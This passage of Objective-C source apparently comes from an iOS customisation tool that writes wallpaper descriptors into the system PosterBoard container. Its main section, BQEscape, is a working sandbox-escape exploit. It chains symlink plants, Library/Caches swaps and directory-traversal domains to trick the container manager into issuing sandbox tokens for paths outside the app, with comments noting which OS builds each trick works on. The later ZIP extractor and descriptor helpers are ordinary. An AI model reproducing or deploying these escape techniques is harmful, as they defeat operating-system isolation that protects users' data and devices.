    if (symlink(stage.fileSystemRepresentation, link.fileSystemRepresentation) != 0) {
        unlink(stageCaches.fileSystemRepresentation);
        [fm removeItemAtPath:stage error:nil];
        return -2;
    }

    NSArray *domains = @[
        [@"Library/Caches/" stringByAppendingString:link.lastPathComponent],
        [@"Caches/" stringByAppendingString:link.lastPathComponent],
        link.lastPathComponent,
    ];
    int64_t last = -1;
    for (NSString *domain in domains) {
        NSString *path = nil;
        int64_t h = bq_query_escape(2, bid, NO, 3, domain, 0x8000000000ULL,
                                    [@"class2-stage-" stringByAppendingString:domain], &path);
        if (h >= 0) {
            DIR *d = opendir(target.fileSystemRepresentation);
            if (!d) {
                BQLog(@"class2-stage: token did not open target (%@)", path ?: @"(null)");
                if (g.release) g.release(h);
                last = -5;
                continue;
            }
            closedir(d);
            unlink(link.fileSystemRepresentation);
            unlink(stageCaches.fileSystemRepresentation);
            rmdir(stageLib.fileSystemRepresentation);
            rmdir(stage.fileSystemRepresentation);
            if (linkOut) *linkOut = target;
            BQLog(@"escape: using class2 stage (%@) path=%@", domain, path ?: @"(null)");
            return h;
        }
        last = h;
    }
    unlink(link.fileSystemRepresentation);
    unlink(stageCaches.fileSystemRepresentation);
    rmdir(stageLib.fileSystemRepresentation);
    rmdir(stage.fileSystemRepresentation);
    return last;
}

static int64_t bq_escape_class2_parent(NSString *target, NSString **linkOut) {
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!home.length || !bid.length) return -6;

    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
    NSString *bak = [home stringByAppendingPathComponent:@"Library.bqtool"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];

    // Recover an interrupted attempt. A stale backup is only safe to restore
    // when the live Library is missing or is our temporary Caches symlink.
    if ([fm fileExistsAtPath:bak]) {
        struct stat st;
        BOOL temp = ([fm fileExistsAtPath:lib] &&
                     lstat(caches.fileSystemRepresentation, &st) == 0 &&
                     S_ISLNK(st.st_mode));
        if (temp || ![fm fileExistsAtPath:lib]) {
            bq_restore_path(lib, bak);
        } else {
            BQLog(@"class2-parent: stale %@ exists; refusing to touch %@", bak, lib);
            return -2;
        }
    }
    if (![fm fileExistsAtPath:lib]) return -2;

    NSError *e = nil;
    if (![fm moveItemAtPath:lib toPath:bak error:&e]) {
        BQLog(@"class2-parent: move Library -> bak failed: %@", e);
        return -2;
    }
    if (![fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:&e]) {
        BQLog(@"class2-parent: recreate Library failed: %@", e);
        [fm moveItemAtPath:bak toPath:lib error:nil];
        return -2;
    }
    if (symlink(target.fileSystemRepresentation, caches.fileSystemRepresentation) != 0) {
        BQLog(@"class2-parent: symlink Caches failed errno=%d (%s)", errno, strerror(errno));
        bq_restore_path(lib, bak);
        return -2;
    }

    NSString *path = nil;
    int64_t h = bq_query_escape(2, bid, NO, 3, @"", 0x8000000000ULL,
                                @"class2-parent", &path);
    // Restore the real Library before returning. Remove the symlink first so a
    // recursive directory removal can never walk into the target.
    unlink(caches.fileSystemRepresentation);
    rmdir(lib.fileSystemRepresentation);
    NSError *re = nil;
    if (![fm moveItemAtPath:bak toPath:lib error:&re]) {
        BQLog(@"class2-parent: restore Library failed: %@", re);
        bq_restore_path(lib, bak);
    }
    if (h >= 0) {
        DIR *d = opendir(target.fileSystemRepresentation);
        if (!d) {
            BQLog(@"class2-parent: token did not open target");
            if (g.release) g.release(h);
            return -5;
        }
        closedir(d);
        if (linkOut) *linkOut = target;
        BQLog(@"escape: using class2 parent -> %@", target);
        return h;
    }
    return h;
}

static int64_t bq_escape_symlink(NSString *target, NSString **linkOut) {
    NSArray<NSString *> *ids = BQGroupIDs();
    if (!ids.count) return -6;
    NSFileManager *fm = [NSFileManager defaultManager];
    int64_t last = -6;
    for (NSString *gid in ids) {
        NSURL *u = [fm containerURLForSecurityApplicationGroupIdentifier:gid];
        NSString *groot = u.path;
        if (!groot.length) continue;
        NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
        NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
        NSString *bak = [lib stringByAppendingPathComponent:@"Caches.bqtool"];
        [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
        bq_recover(lib, [groot stringByAppendingPathComponent:@"Library.bq_orig"]);
        bq_recover(caches, bak);
        if (![fm fileExistsAtPath:caches]) {
            [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
        }
        if (!bq_swap_path(caches, target, bak)) {
            bq_restore_path(caches, bak);
            last = -2;
            continue;
        }
        NSString *path = nil;
        int64_t h = bq_query_escape(7, gid, YES, 3, @"", 0x8000000000ULL,
                                    [@"class7-symlink/" stringByAppendingString:gid], &path);
        if (h >= 0) {
            gEscapeGroupRoot = groot;
            if (linkOut) *linkOut = caches;
            return h;
        }
        bq_restore_path(caches, bak);
        last = h;
    }
    return last;
}

int64_t BQEscape(NSString *target, NSString **linkOut) {
    if (!target.length) return -1;
    bq_load_mcm();
    int64_t last = -1;

    // 0. Exact bad_query file form (free-certificate path used by GestaltEdit).
    if ([target isEqualToString:kMGCaches] || [target hasSuffix:@"/Library/Caches"]) {
        NSString *file = nil;
        int64_t h = bq_escape_bad_query_file(target, &file);
        if (h >= 0) {
            if (linkOut) *linkOut = file;
            return h;
        }
        last = h;
    }

    // 1. Old bad_query: class 13 + part-domain traversal. No app group needed.
    //    Works on builds where the traversal is not patched (27.0.x), fails on 27.2.
    if (gTraversalState >= 0 && target.isAbsolutePath) {
        NSString *dom = [bq_dots(12) stringByAppendingString:target];
        NSString *p = nil;
        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, dom, 0x8000000000ULL,
                                    @"class13-traversal", &p);
        if (h >= 0) {
            gTraversalState = 1;
            if (linkOut) *linkOut = p ?: target;
            BQLog(@"escape: using class13 traversal -> %@", p ?: target);
            return h;
        }
        gTraversalState = -1;
        last = h;
    }

    // 2. Class 12 geod built-in container: direct token, then symlink Caches.
    {
        NSString *link = nil;
        int64_t h = bq_escape_geod_symlink(target, &link);
        if (h >= 0) {
            if (linkOut) *linkOut = link ?: target;
            return h;
        }
        last = h;
    }

    // 3. App-group part-directory symlink (27.2).
    NSString *gid = BQGroupID();
    if (gid.length) {
        NSString *link = nil;
        int64_t h = bq_escape_symlink(target, &link);
        if (h >= 0) {
            if (linkOut) *linkOut = link;
            BQLog(@"escape: using class7 symlink");
            return h;
        }
        last = h;
    }

    // 4. Swap Library/Caches with a symlink using RENAME_SWAP. This avoids the
    //    denied plain rename and never moves Library.
    {
        NSString *link = nil;
        int64_t h = bq_escape_class2_swap(target, &link);
        if (h >= 0) {
            if (linkOut) *linkOut = link ?: target;
            BQLog(@"escape: using class2 swap");
            return h;
        }
        last = h;
    }

    // 5. Class 2 staged symlink: a fake Library/Caches tree inside the app's
    //    Caches, resolved through a partDomain symlink. Safe and no app group.
    {
        NSString *link = nil;
        int64_t h = bq_escape_class2_stage(target, &link);
        if (h >= 0) {
            if (linkOut) *linkOut = link ?: target;
            BQLog(@"escape: using class2 stage");
            return h;
        }
        last = h;
    }

    // 6. Class 2 symlink inside the existing Library/Caches. This is safe and
    //    needs no app group; it only works if MCM follows a relative symlink in
    //    partDomain without rejecting the resolved target.
    {
        NSString *link = nil;
        int64_t h = bq_escape_class2_subpath(target, &link);
        if (h >= 0) {
            if (linkOut) *linkOut = link ?: target;
            BQLog(@"escape: using class2 subpath");
            return h;
        }
        last = h;
    }

    // 7. Class 2 parent-directory symlink. No app group needed: move the app's
    //    Library aside, create Library/Caches -> target, query the app's own
    //    container (class 2), then restore Library. Off by default: some builds
    //    kill the process for moving Library, so this is opt-in from Settings.
    if (gClass2ParentEnabled) {
        NSString *link = nil;
        int64_t h = bq_escape_class2_library_swap(target, &link);
        [[NSUserDefaults standardUserDefaults] setBool:NO forKey:@"BQClass2ParentCrashGuard"];
        [[NSUserDefaults standardUserDefaults] synchronize];
        if (h >= 0) {
            if (linkOut) *linkOut = link ?: target;
            BQLog(@"escape: using class2 library swap");
            return h;
        }
        last = h;

        h = bq_escape_class2_parent(target, &link);
        if (h >= 0) {
            if (linkOut) *linkOut = link ?: target;
            BQLog(@"escape: using class2 parent");
            return h;
        }
        last = h;
    } else {
        BQLog(@"class2-parent disabled (enable in Settings if there is no app group)");
    }

    // 8. Class 13 direct MobileGestalt query (some 27.0.x builds).
    if ([target isEqualToString:kMGCaches]) {
        NSString *p = nil;
        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, @"", 0x8000000000ULL,
                                    @"class13-direct", &p);
        if (h >= 0) {
            if (linkOut) *linkOut = p ?: target;
            BQLog(@"escape: using class13 direct");
            return h;
        }
        last = h;
    }

    // 9. Class 12 geod part-domain traversal (older builds).
    if (target.isAbsolutePath) {
        NSString *dom = [bq_dots(12) stringByAppendingString:target];
        NSString *p = nil;
        int64_t h = bq_query_escape(12, @"com.apple.geod", NO, 3, dom, 0x8000000000ULL,
                                    @"class12-geod-traversal", &p);
        if (h >= 0) {
            if (linkOut) *linkOut = p ?: target;
            BQLog(@"escape: using class12 geod traversal");
            return h;
        }
        last = h;
    }

    BQLog(@"escape: all strategies failed (last=%lld) target=%@", (long long)last, target);
    return last;
}

static NSString *bq_escape_error(int64_t h) {
    if (h == -6) {
        return NSLocalizedString(@"no app group — open Settings → Class-2 fallback (experimental), enable it, then retry", nil);
    }
    if (h == -2) {
        return NSLocalizedString(@"class-2 fallback could not move Library — this build needs an app group on 27.2", nil);
    }
    if (h == -5) {
        return NSLocalizedString(@"the MCM query returned no sandbox token — send Documents/bqtool.log", nil);
    }
    return [NSString stringWithFormat:NSLocalizedString(@"escape failed (%lld)", nil), (long long)h];
}

void BQEndEscape(int64_t handle) {
    if (handle >= 0 && g.release) g.release(handle);
    if (gClass2SubpathLink.length) {
        unlink(gClass2SubpathLink.fileSystemRepresentation);
        gClass2SubpathLink = nil;
    }
    NSString *groot = gEscapeGroupRoot;
    gEscapeGroupRoot = nil;
    if (!groot.length) return;
    NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
    NSString *bak = [lib stringByAppendingPathComponent:@"Caches.bqtool"];
    bq_restore_path(caches, bak);
}

static int bq_probe_base(NSString *base, uint64_t cls, NSString *ident, NSString *target, NSString *label) {
    if (!base.length || !ident.length) {
        BQLog(@"probe[%@]: missing base/identifier", label);
        return -1;
    }
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *lib = [base stringByAppendingPathComponent:@"Library"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
    NSString *bak = [lib stringByAppendingPathComponent:@"Caches.probe"];
    [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
    bq_recover(caches, bak);
    if (![fm fileExistsAtPath:caches]) {
        [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
    }
    BQLog(@"probe[%@]: base=%@ target=%@", label, base, target);
    if (!bq_swap_path(caches, target, bak)) {
        bq_restore_path(caches, bak);
        return -2;
    }
    void *q = g.create();
    if (!q) { bq_restore_path(caches, bak); return -3; }
    g.set_class(q, cls);
    xpc_object_t x = p_xpc_string_create ? p_xpc_string_create(ident.UTF8String) : NULL;
    if (cls == 7 && g.set_group_ids) g.set_group_ids(q, x);
    else if (g.set_ids) g.set_ids(q, x);
    else if (g.set_group_ids) g.set_group_ids(q, x);
    if (g.set_part) g.set_part(q, 3);
    if (g.set_flags) g.set_flags(q, 0x8000000000ULL);
    if (x && p_xpc_release) p_xpc_release(x);
    void *res = g.get_one(q);
    BQLog(@"probe[%@]: result=%p", label, res);
    if (!res) {
        bq_log_query_error(q, label);
        g.query_free(q);
        bq_restore_path(caches, bak);
        return -4;
    }
    char *tok = g.copy_token ? g.copy_token(res) : NULL;
    int64_t h = (tok && g.consume) ? g.consume(tok) : -5;
    BQLog(@"probe[%@]: token=%s consume=%lld", label, tok ? "YES" : "NO", (long long)h);
    if (tok) free(tok);
    g.query_free(q);
    int rc = -6;
    if (h >= 0) {
        NSString *leaf = [NSString stringWithFormat:@".bqtool_probe_%d", getpid()];
        NSString *p = [caches stringByAppendingPathComponent:leaf];
        int fd = open(p.fileSystemRepresentation, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
        if (fd >= 0) {
            ssize_t w = write(fd, "ok", 2);
            close(fd);
            unlink(p.fileSystemRepresentation);
            rc = (w == 2) ? 0 : -7;
            BQLog(@"probe[%@]: marker=%s", label, rc == 0 ? "OK" : "write-failed");
        } else {
            BQLog(@"probe[%@]: marker open failed errno=%d", label, errno);
            rc = -7;
        }
        g.release(h);
    }
    bq_restore_path(caches, bak);
    return rc;
}

NSDictionary *BQProbeEscapeClasses(NSString *target) {
    NSMutableDictionary *r = [NSMutableDictionary dictionary];
    NSString *bundle = [[NSBundle mainBundle] bundleIdentifier];
    NSString *gid = BQGroupID();
    NSString *groot = BQGroupRoot();
    r[@"bundle"] = bundle ?: @"(nil)";
    r[@"group_id"] = gid ?: @"(none)";
    r[@"group_root"] = groot ?: @"(none)";
    r[@"own_home"] = NSHomeDirectory() ?: @"(nil)";
    r[@"class7"] = @(bq_probe_base(groot, 7, gid, target, @"class7"));
    r[@"class2"] = @(bq_probe_base(NSHomeDirectory(), 2, bundle, target, @"class2"));
    BQLog(@"probe summary: %@", r);
    return r;
}

static char *bq_query_part_path(uint64_t cls, NSString *ident, uint64_t part, uint64_t flags) {
    void *q = g.create();
    if (!q) return NULL;
    g.set_class(q, cls);
    xpc_object_t x = p_xpc_string_create ? p_xpc_string_create(ident.UTF8String) : NULL;
    if (cls == 7 && g.set_group_ids) g.set_group_ids(q, x);
    else if (g.set_ids) g.set_ids(q, x);
    if (g.set_part) g.set_part(q, part);
    if (g.set_flags) g.set_flags(q, flags);
    if (x && p_xpc_release) p_xpc_release(x);
    void *res = g.get_one(q);
    char *copy = NULL;
    if (res && g.get_path) {
        const char *p = g.get_path(res);
        if (p) copy = strdup(p);
    }
    g.query_free(q);
    return copy;
}

NSDictionary *BQProbeClass2Parts(NSString *target) {
    NSMutableDictionary *r = [NSMutableDictionary dictionary];
    NSString *bundle = [[NSBundle mainBundle] bundleIdentifier];
    NSMutableDictionary *paths = [NSMutableDictionary dictionary];
    for (uint64_t p = 0; p <= 6; p++) {
        char *cp = bq_query_part_path(2, bundle, p, 0x100000000ULL);
        NSString *path = cp ? [NSString stringWithUTF8String:cp] : nil;
        if (cp) free(cp);
        BQLog(@"c2 part %llu -> %@", p, path ?: @"(null)");
        if (path.length) {
            paths[@(p).stringValue] = path;
            r[@(p).stringValue] = path;
        }
    }
    for (uint64_t p = 2; p <= 6; p++) {
        NSString *path = paths[@(p).stringValue];
        if (!path.length) continue;
        struct stat st;
        if (lstat(path.fileSystemRepresentation, &st) != 0 || !S_ISDIR(st.st_mode)) {
            BQLog(@"c2 move p%llu: not a dir", p);
            continue;
        }
        NSString *bak = [path stringByAppendingString:@".bqpartprobe"];
        unlink(bak.fileSystemRepresentation);
        errno = 0;
        int mv = rename(path.fileSystemRepresentation, bak.fileSystemRepresentation);
        BQLog(@"c2 move p%llu %@ -> %d errno=%d", p, path, mv, errno);
        if (mv != 0) continue;
        unlink(path.fileSystemRepresentation);
        errno = 0;
        int sl = symlink(target.fileSystemRepresentation, path.fileSystemRepresentation);
        BQLog(@"c2 symlink p%llu -> %d errno=%d", p, sl, errno);
        if (sl == 0) {
            void *q = g.create();
            if (q) {
                g.set_class(q, 2);
                xpc_object_t x = p_xpc_string_create ? p_xpc_string_create(bundle.UTF8String) : NULL;
                if (g.set_ids) g.set_ids(q, x);
                if (g.set_part) g.set_part(q, p);
                if (g.set_flags) g.set_flags(q, 0x8000000000ULL);
                if (x && p_xpc_release) p_xpc_release(x);
                void *res = g.get_one(q);
                char *tok = res && g.copy_token ? g.copy_token(res) : NULL;
                int64_t h = (tok && g.consume) ? g.consume(tok) : -1;
                BQLog(@"c2 p%llu result=%p token=%s consume=%lld", p, res, tok ? "YES" : "NO", (long long)h);
                if (tok) free(tok);
                if (h >= 0) {
                    NSString *marker = [path stringByAppendingPathComponent:
                        [NSString stringWithFormat:@".bqpartprobe_%d", getpid()]];
                    int fd = open(marker.fileSystemRepresentation, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
                    if (fd >= 0) {
                        write(fd, "ok", 2);
                        close(fd);
                        unlink(marker.fileSystemRepresentation);
                        BQLog(@"c2 p%llu marker OK", p);
                    } else {
                        BQLog(@"c2 p%llu marker fail errno=%d", p, errno);
                    }
                    g.release(h);
                }
                g.query_free(q);
            }
            unlink(path.fileSystemRepresentation);
        }
        rename(bak.fileSystemRepresentation, path.fileSystemRepresentation);
    }
    return r;
}

BOOL BQCheckAccess(NSString *target, BOOL writable, NSString **err) {
    NSString *link = nil;
    int64_t h = BQEscape(target, &link);
    if (h < 0) {
        if (err) *err = bq_escape_error(h);
        return NO;
    }
    BOOL ok = NO;
    BOOL fileLink = [link.lastPathComponent hasSuffix:@".plist"];
    if (writable) {
        if (fileLink) {
            int fd = open(link.fileSystemRepresentation, O_RDWR | O_CLOEXEC);
            if (fd >= 0) { ok = YES; close(fd); }
            else if (err) *err = [NSString stringWithFormat:@"open %@ failed: %s", link, strerror(errno)];
        } else {
            NSString *leaf = [NSString stringWithFormat:@".bqtool_probe_%d", getpid()];
            NSString *p = [link stringByAppendingPathComponent:leaf];
            int fd = open(p.fileSystemRepresentation, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
            if (fd >= 0) {
                ok = (write(fd, "ok", 2) == 2);
                close(fd);
                unlink(p.fileSystemRepresentation);
            } else {
                if (err) *err = [NSString stringWithFormat:@"open %@ failed: %s", target, strerror(errno)];
            }
        }
    } else {
        if (fileLink) {
            int fd = open(link.fileSystemRepresentation, O_RDONLY | O_CLOEXEC);
            if (fd >= 0) { ok = YES; close(fd); }
            else if (err) *err = [NSString stringWithFormat:@"open %@ failed: %s", link, strerror(errno)];
        } else {
            DIR *d = opendir(link.fileSystemRepresentation);
            if (d) { ok = YES; closedir(d); }
            else if (err) *err = [NSString stringWithFormat:@"opendir %@ failed: %s", target, strerror(errno)];
        }
    }
    BQEndEscape(h);
    return ok;
}

// ------------------------------------------------------------- ZIP / unzip ---
static uint16_t bq_rd16(const uint8_t *p) { return (uint16_t)(p[0] | (p[1] << 8)); }
static uint32_t bq_rd32(const uint8_t *p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

static NSData *bq_inflate_raw(const uint8_t *src, NSUInteger srcLen, NSUInteger dstLen) {
    if (!src || srcLen == 0) return nil;
    z_stream zs;
    memset(&zs, 0, sizeof(zs));
    if (inflateInit2(&zs, -MAX_WBITS) != Z_OK) return nil;
    NSUInteger cap = dstLen ? dstLen : (srcLen * 4 + 4096);
    NSMutableData *out = [NSMutableData dataWithLength:cap];
    if (!out) { inflateEnd(&zs); return nil; }
    zs.next_in = (Bytef *)src;
    zs.avail_in = (uInt)srcLen;
    zs.next_out = (Bytef *)out.mutableBytes;
    zs.avail_out = (uInt)cap;
    int r = inflate(&zs, Z_FINISH);
    NSUInteger produced = cap - zs.avail_out;
    inflateEnd(&zs);
    if (r != Z_STREAM_END) return nil;
    out.length = produced;
    return out;
}

static BOOL bq_zip_path_ok(NSString *name, NSString **cleanOut) {
    if (!name.length) return NO;
    NSString *clean = [name stringByReplacingOccurrencesOfString:@"\\" withString:@"/"];
    if ([clean hasPrefix:@"/"] || [clean hasPrefix:@"~"]) return NO;
    for (NSString *c in [clean componentsSeparatedByString:@"/"]) {
        if ([c isEqualToString:@".."] || [c isEqualToString:@"."]) return NO;
    }
    if ([clean isEqualToString:@"__MACOSX"] || [clean hasPrefix:@"__MACOSX/"]) return NO;
    if (cleanOut) *cleanOut = clean;
    return YES;
}

static BOOL bq_unzip_data(NSData *data, NSString *dest, NSString **err) {
    const uint8_t *b = data.bytes;
    NSUInteger n = data.length;
    if (n < 22) { if (err) *err = @"short zip"; return NO; }
    NSInteger eocd = -1;
    for (NSInteger i = (NSInteger)n - 22; i >= 0; i--) {
        if (bq_rd32(b + i) == 0x06054b50) { eocd = i; break; }
    }
    if (eocd < 0) { if (err) *err = @"EOCD not found"; return NO; }
    uint16_t entries = bq_rd16(b + eocd + 10);
    uint32_t cdSize = bq_rd32(b + eocd + 12);
    uint32_t cdOff = bq_rd32(b + eocd + 16);
    if ((NSUInteger)cdOff + cdSize > n) { if (err) *err = @"bad central directory"; return NO; }

    NSFileManager *fm = [NSFileManager defaultManager];
    [fm createDirectoryAtPath:dest withIntermediateDirectories:YES attributes:nil error:nil];
    NSUInteger p = cdOff;
    int files = 0;
    for (uint16_t i = 0; i < entries; i++) {
        if (p + 46 > n || bq_rd32(b + p) != 0x02014b50) break;
        uint16_t method = bq_rd16(b + p + 10);
        uint32_t csize = bq_rd32(b + p + 20);
        uint32_t usize = bq_rd32(b + p + 24);
        uint16_t nameLen = bq_rd16(b + p + 28);
        uint16_t extraLen = bq_rd16(b + p + 30);
        uint16_t commentLen = bq_rd16(b + p + 32);
        uint32_t localOff = bq_rd32(b + p + 42);
        if (p + 46 + nameLen > n) break;
        NSString *rawName = [[NSString alloc] initWithBytes:b + p + 46 length:nameLen encoding:NSUTF8StringEncoding];
        if (!rawName) rawName = [[NSString alloc] initWithBytes:b + p + 46 length:nameLen encoding:NSISOLatin1StringEncoding];
        p += 46 + nameLen + extraLen + commentLen;
        if (csize == 0xFFFFFFFF || usize == 0xFFFFFFFF || localOff == 0xFFFFFFFF) {
            BQLog(@"zip: ZIP64 entry skipped: %@", rawName);
            continue;
        }
        NSString *name = nil;
        if (!bq_zip_path_ok(rawName, &name)) continue;
        if ([name hasSuffix:@"/"]) {
            [fm createDirectoryAtPath:[dest stringByAppendingPathComponent:name]
          withIntermediateDirectories:YES attributes:nil error:nil];
            continue;
        }
        if ((NSUInteger)localOff + 30 > n || bq_rd32(b + localOff) != 0x04034b50) continue;
        uint16_t lnameLen = bq_rd16(b + localOff + 26);
        uint16_t lextraLen = bq_rd16(b + localOff + 28);
        NSUInteger dataOff = localOff + 30 + lnameLen + lextraLen;
        if (dataOff + csize > n) continue;
        NSData *out = nil;
        if (method == 0) {
            out = [NSData dataWithBytes:b + dataOff length:csize];
        } else if (method == 8) {
            out = bq_inflate_raw(b + dataOff, csize, usize);
        } else {
            BQLog(@"zip: unsupported method %u for %@", method, name);
            continue;
        }
        if (!out) { BQLog(@"zip: inflate failed for %@", name); continue; }
        NSString *full = [dest stringByAppendingPathComponent:name];
        [fm createDirectoryAtPath:[full stringByDeletingLastPathComponent]
      withIntermediateDirectories:YES attributes:nil error:nil];
        if (![out writeToFile:full atomically:YES]) {
            BQLog(@"zip: write failed for %@", name);
            continue;
        }
        files++;
    }
    BQLog(@"zip: extracted %d file(s) to %@", files, dest);
    if (files == 0) { if (err) *err = @"zip contained no files"; return NO; }
    return YES;
}

// ------------------------------------------------------ descriptor helpers ---
static NSArray<NSString *> *bq_children(NSString *dir) {
    NSError *e = nil;
    NSArray *a = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dir error:&e];
    if (!a) { BQLog(@"list %@ failed: %@", dir, e); return @[]; }
    return a;
}

static BOOL bq_is_descriptor_container_name(NSString *name) {
    NSString *l = name.lowercaseString;
    return [l isEqualToString:@"descriptor"] || [l isEqualToString:@"descriptors"] ||
           [l isEqualToString:@"ordered-descriptor"] || [l isEqualToString:@"ordered-descriptors"] ||
           [l isEqualToString:@"video-descriptor"] || [l isEqualToString:@"video-descriptors"];
}

static BOOL bq_is_descriptor(NSString *dir) {
    for (NSString *c in bq_children(dir)) {
        if ([c isEqualToString:@"com.apple.posterkit.provider.descriptor.identifier"]) return YES;
    }
    return NO;
}

static void bq_add_descriptor_folders(NSString *dir, NSMutableArray<NSString *> *out) {
    for (NSString *c in bq_children(dir)) {
        if ([c isEqualToString:@"__MACOSX"]) continue;
        [out addObject:[dir stringByAppendingPathComponent:c]];
    }
}

static NSArray<NSString *> *bq_find_descriptors(NSString *root) {
    // Returns a flat list of descriptor folder paths. The caller decides the target
    // provider by inspecting the folder's parent chain.
    NSMutableArray<NSString *> *result = [NSMutableArray array];
    NSArray<NSString *> *top = bq_children(root);
    for (NSString *name in top) {
        if ([name isEqualToString:@"__MACOSX"]) continue;
        NSString *full = [root stringByAppendingPathComponent:name];
        NSString *l = name.lowercaseString;
        if ([l isEqualToString:@"container"]) {
            NSString *extRoot = [full stringByAppendingPathComponent:
                @"Library/Application Support/PRBPosterExtensionDataStore/61/Extensions"];
            if ([[NSFileManager defaultManager] fileExistsAtPath:extRoot]) {
                for (NSString *ext in bq_children(extRoot)) {
                    NSString *desc = [[extRoot stringByAppendingPathComponent:ext]
                                      stringByAppendingPathComponent:@"descriptors"];
                    if ([[NSFileManager defaultManager] fileExistsAtPath:desc]) {
                        bq_add_descriptor_folders(desc, result);
                    }
                }
                if (result.count) return result;
            }
        }
    }
    for (NSString *name in top) {
        if ([name isEqualToString:@"__MACOSX"]) continue;
        NSString *full = [root stringByAppendingPathComponent:name];
        NSString *l = name.lowercaseString;
        if ([l isEqualToString:@"video-descriptor"] || [l isEqualToString:@"video-descriptors"] ||
            [l isEqualToString:@"descriptor"] || [l isEqualToString:@"descriptors"] ||
            [l isEqualToString:@"ordered-descriptor"] || [l isEqualToString:@"ordered-descriptors"]) {
            bq_add_descriptor_folders(full, result);
        }
    }
    if (result.count) return result;

    NSDirectoryEnumerator *en = [[NSFileManager defaultManager] enumeratorAtPath:root];
    for (NSString *rel in en) {
        if ([rel.lastPathComponent isEqualToString:@"__MACOSX"]) continue;
        NSString *full = [root stringByAppendingPathComponent:rel];
        BOOL isDir = NO;
        if (![[NSFileManager defaultManager] fileExistsAtPath:full isDirectory:&isDir] || !isDir) continue;
        if (bq_is_descriptor_container_name(rel.lastPathComponent)) {
            bq_add_descriptor_folders(full, result);
        } else if (bq_is_descriptor(full)) {
            [result addObject:full];
        }
    }
    return result;
}

static void bq_randomize_descriptor(NSString *dir) {
    unsigned ident = 9999 + arc4random_uniform(90000);
    NSFileManager *fm = [NSFileManager defaultManager];
    NSDirectoryEnumerator *en = [fm enumeratorAtPath:dir];
    for (NSString *rel in en) {
        NSString *name = rel.lastPathComponent;
        NSString *full = [dir stringByAppendingPathComponent:rel];
        if ([name isEqualToString:@"com.apple.posterkit.provider.descriptor.identifier"]) {
            [[NSString stringWithFormat:@"%u", ident]
                writeToFile:full atomically:YES encoding:NSUTF8StringEncoding error:nil];
        } else if ([name isEqualToString:@"com.apple.posterkit.provider.contents.userInfo"] ||
                   [name isEqualToString:@"Wallpaper.plist"]) {
            NSMutableDictionary *d = [NSMutableDictionary dictionaryWithContentsOfFile:full];
            if (d) {
                if ([name isEqualToString:@"Wallpaper.plist"]) d[@"identifier"] = @(ident);
                else d[@"wallpaperRepresentingIdentifier"] = @(ident);
                [d writeToFile:full atomically:YES];
            }
        }
    }
}

// ------------------------------------------------------------ PosterBoard ---
NSArray<NSString *> *BQPosterBoardExtensions(void) {
    return @[kPBCollections, kPBCollectionsModern, kPBMercury, kPBPhotos];
}

NSString *BQPosterBoardDescriptorsPath(NSString *ext) {
    NSString *container = [[NSUserDefaults standardUserDefaults] stringForKey:@"BQPBContainer"];
    if (!container.length) return nil;
    return [container stringByAppendingPathComponent:
            [NSString stringWithFormat:@"Library/Application Support/PRBPosterExtensionDataStore/%@/Extensions/%@/descriptors",
             kPBExtVersion, ext]];
}

static BOOL bq_is_pb_container(NSString *path) {
    NSString *link = nil;
    int64_t h = BQEscape(path, &link);
    if (h < 0) return NO;
    NSString *prb = [link stringByAppendingPathComponent:@"Library/Application Support/PRBPosterExtensionDataStore"];
    struct stat st;
    BOOL ok = (stat(prb.fileSystemRepresentation, &st) == 0 && S_ISDIR(st.st_mode));
    BQEndEscape(h);
    return ok;
}

NSString *BQFindPosterBoardContainer(NSString **err) {
    NSString *cached = [[NSUserDefaults standardUserDefaults] stringForKey:@"BQPBContainer"];
    if (cached.length && bq_is_pb_container(cached)) return cached;

    NSArray *roots = @[
        @"/var/mobile/Containers/Data/Application",
        @"/var/mobile/Containers/Data/InternalDaemon",
        @"/var/mobile/Containers/Data/PluginKitPlugin",
    ];
    for (NSString *root in roots) {
        char *lst = bq_list(root.fileSystemRepresentation, 400000);
        if (!lst) continue;
        NSString *s = [NSString stringWithUTF8String:lst];
        free(lst);
        NSArray *lines = [s componentsSeparatedByString:@"\n"];
        int n = 0;
        for (NSString *line in lines) {
            if (!line.length) continue;
            if (++n > 400) break;
            if (bq_is_pb_container(line)) {
                [[NSUserDefaults standardUserDefaults] setObject:line forKey:@"BQPBContainer"];
                [[NSUserDefaults standardUserDefaults] synchronize];
                BQLog(@"PosterBoard container: %@", line);
                return line;
            }
            if (n % 50 == 0) BQLog(@"PB scan: %d", n);
        }
    }
    if (err) *err = @"PosterBoard container not found";
    return nil;
}

static BOOL bq_ensure_pb_descriptors(NSString *container, NSString *ext, NSString **err) {
    NSString *target = [container stringByAppendingPathComponent:
        [NSString stringWithFormat:@"Library/Application Support/PRBPosterExtensionDataStore/%@/Extensions/%@/descriptors",
         kPBExtVersion, ext]];
    NSString *link = nil;
    int64_t h = BQEscape(container, &link);
    if (h < 0) {
        if (err) *err = [NSString stringWithFormat:@"escape to PB container failed (%lld)", (long long)h];
        return NO;
    }
    NSString *rel = [target substringFromIndex:container.length];
    NSString *p = [link stringByAppendingPathComponent:rel];
    BOOL ok = [[NSFileManager defaultManager] createDirectoryAtPath:p
